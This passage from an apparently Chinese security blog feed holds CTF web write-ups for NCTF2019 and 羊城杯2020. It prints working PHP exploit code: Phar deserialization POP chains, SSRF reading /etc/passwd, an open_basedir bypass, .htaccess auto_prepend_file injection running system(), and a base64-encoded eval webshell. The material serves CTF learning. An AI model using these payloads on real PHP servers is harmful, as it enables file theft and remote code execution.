class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">$imageFileType=substr($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],strrpos($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>,strlen($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"></span><br><span class="line">$file_name = md5(time());</span><br><span class="line">$file_name =substr($file_name, <span class="number">0</span>, <span class="number">10</span>).<span class="string">&quot;.&quot;</span>.$imageFileType;</span><br><span class="line"></span><br><span class="line">$target_file=$target_dir.$file_name;</span><br><span class="line"></span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($imageFileType !== <span class="string">&quot;jpg&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;png&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;gif&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;jpeg&quot;</span>  ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file <span class="subst">$file_name</span>  has been uploaded to ./uploads/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>单独看这个upload.php使用了白名单限制，只能上传图片后缀的文件，应该要结合其他的功能点一起利用。</p><p>再看catchmime.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">&#x27;careful&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个文件中存在两个和功能不相干的类<code>Main</code>和<code>Easytest</code>。</p><p><code>getimagesize</code>会触发Phar反序列化，然后在<code>careful</code>参数触发<code>Easy_test</code>类的反序列化，修改test参数为1。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url = <span class="string">&#x27;file:///etc/passwd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line">@unlink(<span class="string">&quot;phar1.phar&quot;</span>);<span class="comment">//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($b);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后payload打过去</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119191059.png" alt=""></p><p>读了一圈文件，没找到flag，又不能执行命令，尝试去读<code>/etc/hosts</code>（或者<code>/etc/net/arp</code>)</p><p>读到了一个内网IP地址<code>10.247.100.9</code>。结果BUU上面我试了好几个C段地址之后，<code>10.247.100.11</code>这个地址终于返回了PHP-FPM。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211543.png" alt=""></p><p>接着就用SSRF打FPM，网上都是用P牛的脚本去构造，</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211947.png" alt=""></p><p>有open_basedir限制，绕过一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119215144.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NCTF2019-Phar-matches-everything&quot;&gt;NCTF2019 Phar matches everything&lt;/h1&gt;
&lt;p&gt;去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。&lt;/p&gt;
&lt;p&gt;原题目提示是通过vim的
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2020-Web-Writeups</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/</id>
    <published>2020-12-10T14:53:59.000Z</published>
    <updated>2020-12-10T14:55:48.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2020-Web-Writeup">羊城杯2020 Web Writeup</h1><p>当时没时间打，现在题目在GitHub上开源了，随便看看。</p><h2 id="easycon">easycon</h2><p>蚁剑连接一句话，下载bbbbbbbbb.txt文件，是一个少了头部分的base64编码的图片，加上头再转码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163136.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163156.png" alt=""></p><h2 id="easyser">easyser</h2><p>这题目说实在的，提示地太隐晦了，用不安全的协议读取ser.php文件，Fuzz半天发现是用<code>http://127.0.0.1/star1.php</code>读取源码。</p><p>ser.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">        @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*$c=$_GET[&#x27;c&#x27;];</span></span><br><span class="line"><span class="comment">echo $x=unserialize($c);*/</span></span><br></pre></td></tr></table></figure><p>POP链构造+绕过exit</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;php://filter/convert.base64-decode/resource=aaa.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $text = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> GWHT;</span><br><span class="line">$a-&gt;hero = <span class="keyword">new</span> Yongen;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="easyphp">easyphp</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一反应就是覆盖掉index.php，但是好像没有写入权限，那大概率应该就是用<code>.htaccess</code>这个文件做文章了。</p><p>第一种思路，向<code>.htaccess</code>文件写入shell，并且用auto_prepend_file包含<code>.htaccess</code>，但是<code>file</code>关键字被ban了，可以用换行绕过，结尾要用<code>\</code>处理content中的<code>\n</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;? php%20system(&#39;cat%20&#x2F;fl[a]g&#39;);?&gt;\</span><br></pre></td></tr></table></figure><p>第二种思路，依然是利用<code>.htaccess</code>文件特性，不过这次是通过设置php_value来设置<code>preg_macth</code>正则回溯次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><p>先写入<code>.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>再直接通过<code>php://filter</code>伪协议写入一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs&#x2F;Plw&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><h2 id="easyphp2">easyphp2</h2><p>robots.txt提示有check.php</p><p>伪协议读取源码：</p><blockquote><p><a href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure><p>GWHT.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        <span 